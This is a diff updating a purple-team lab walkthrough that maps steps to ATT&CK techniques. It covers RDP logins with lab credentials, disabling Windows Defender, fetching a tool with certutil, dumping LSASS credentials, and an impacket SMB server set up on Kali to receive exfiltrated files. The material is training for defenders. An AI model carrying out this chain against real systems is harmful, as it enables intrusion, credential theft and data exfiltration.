@@ -30,7 +30,7 @@ Let's RDP in and have a look around
 
 **Step 1**
 ```bash
-[KALI:bash] xfreerdp /u:PurpleUser /p:SecurePwd123 /v:10.0.1.15 /cert-ignore
+[KALI:bash] xfreerdp3 /u:PurpleUser /p:SecurePwd123 /v:10.0.1.15 /cert:ignore +clipboard
 ```
 ATT&CK Techniques: `T1021.001` `T1078`
 
@@ -83,7 +83,7 @@ ATT&CK Techniques: `?`
 
 We see that we have admin privileges on this system, let's disable some security tools to make our life simpler...
 
-Let's disable a bunch of useful things in Windows Defender.
+Re-open PowerShell as Administrator and let's disable a bunch of useful things in Windows Defender.
 We can turn off realtime monitoring (which includes antivirus), behavior monitoring, script scanning, and blocking at first sight.
 
 **Step 7**
@@ -111,7 +111,7 @@ We can transfer the tool using `certutil`
 ```
 ATT&CK Techniques: `T1005`
 
-And then execute it to dump the credentials from LSASS process
+And then execute it to dump the credentials from LSASS process (make sure PowerShell is running with admin privileges)
 
 **Step 9**
 ```PowerShell
@@ -256,7 +256,7 @@ With Domain Admin privileges we can now finally log into the 3rd server.
 
 **Step 19**
 ```bash
-[KALI:bash] xfreerdp /u:Administrator /p:'DomainPwned!' /d:ATTACKRANGE /v:10.0.1.16 /cert-ignore
+[KALI:bash] xfreerdp3 /u:Administrator /p:'DomainPwned!' /d:ATTACKRANGE /v:10.0.1.16 /cert:ignore +clipboard
 ```
 ATT&CK Techniques: `T1021.001` `T1078`
 
@@ -296,7 +296,7 @@ Then we start the SMB server on Kali:
 [KALI:bash] impacket-smbserver -smb2support -username user -password pass123 data ./loot
 ```
 
-And finally we exfiltrate the files that we want:
+And finally we exfiltrate the files that we want (make sure PowerShell is runnning with admin privileges):
 
 **Step 23**
 ```PowerShell
